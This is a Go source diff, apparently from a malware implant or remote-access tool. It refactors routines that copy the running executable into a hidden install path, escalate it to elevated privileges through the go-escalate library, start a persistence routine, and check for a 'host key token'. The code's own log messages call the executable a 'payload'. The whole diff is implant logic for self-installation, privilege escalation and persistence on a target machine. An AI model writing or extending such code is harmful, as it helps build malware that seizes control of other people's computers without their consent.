@@ -12,55 +12,74 @@ import (
 	"github.com/lu4p/go-escalate"
 )
 
-func copyExecuteable() error {
-	log.Println("copyExecuteable")
+// Setup add Persitence
+func SetupDaemon() {
+	log.Println("[SetupDaemon] Passing off to Daemon installer...")
+	go Persist(PathExe)
+}
 
+func installExecuteable() error {
 	if err := os.RemoveAll(Path); err != nil {
+		log.Println("[InstallExe] [!] Could NOT remove old executeable: ", err)
 		return err
 	}
-
-	log.Println("Removed Old Executeable")
+	log.Println("[InstallExe] Removed old executeable before install")
 
 	ex, err := os.Executable()
 	if err != nil {
+		log.Println("[InstallExe] [!] Couldn't find the currently running exe: ", err)
 		return err
 	}
 
 	data, err := ioutil.ReadFile(ex)
 	if err != nil {
+		log.Println("[InstallExe] [!] Could not read current exe: ", err)
 		return err
 	}
 
 	if err = os.MkdirAll(Path, os.ModePerm); err != nil {
+		log.Println("[InstallExe] [!] Could not create path for new exe: ", err)
 		return err
 	}
 
-	return ioutil.WriteFile(PathExe, data, os.ModePerm)
+	if err = ioutil.WriteFile(PathExe, data, os.ModePerm); err != nil {
+		log.Println("[InstallExe] [!] Could not write exe to path: ", err)
+		return err
+	}
+
+	return nil
 }
 
 // Elevate elevate task
 func Elevate() error {
-	log.Println("Elevate")
-	err := copyExecuteable()
+	log.Println("[Elevate] Installing payload into: ", PathExe)
+
+	err := installExecuteable()
 	if err != nil {
-		return errors.New("copy failed")
+		return errors.New("[Elevate] [!] Could NOT copy payload into target path")
+	} else {
+		log.Println("[Elevate] [+] Successfully copied payload into target path")
 	}
+
+	// Escalate exe and return
 	return escalate.Escalate(PathExe)
 }
 
 // CheckSetup check wheter already configured
-func CheckSetup() bool {
-	log.Println("CheckSetup")
+func CheckExisting() bool {
+	log.Println("[CheckExisting] Am I the existing install?")
+
 	osexe, _ := os.Executable()
 	if osexe == PathExe {
 		_, err := os.Stat(filepath.Join(Path, "token"))
-		return err != nil
+		if err != nil {
+			log.Println("[CheckExisting] [!] Host key token is missing")
+			return false
+		}
+		log.Println("[CheckExisting] I AM the existing install!")
+		return true
 	}
+	log.Println("[CheckExisting] I am NOT the existing install!")
 	return false
-}
 
-// Setup add Persitence
-func Setup() {
-	log.Println("Setup")
-	go Persist(PathExe)
 }
